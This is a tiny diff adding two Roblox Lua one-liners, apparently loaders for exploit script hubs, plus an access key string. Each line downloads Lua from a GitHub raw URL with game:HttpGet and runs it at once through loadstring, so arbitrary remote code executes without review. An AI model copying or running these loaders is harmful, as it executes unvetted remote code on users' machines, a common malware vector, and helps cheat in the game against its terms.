@@ -1,0 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/loader", true))()
+neoxfree_tB7wXBaOGn --key
+
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Markklol/aw/refs/heads/main/Protected/DRailsv2.lua'))() --keyless  
+  
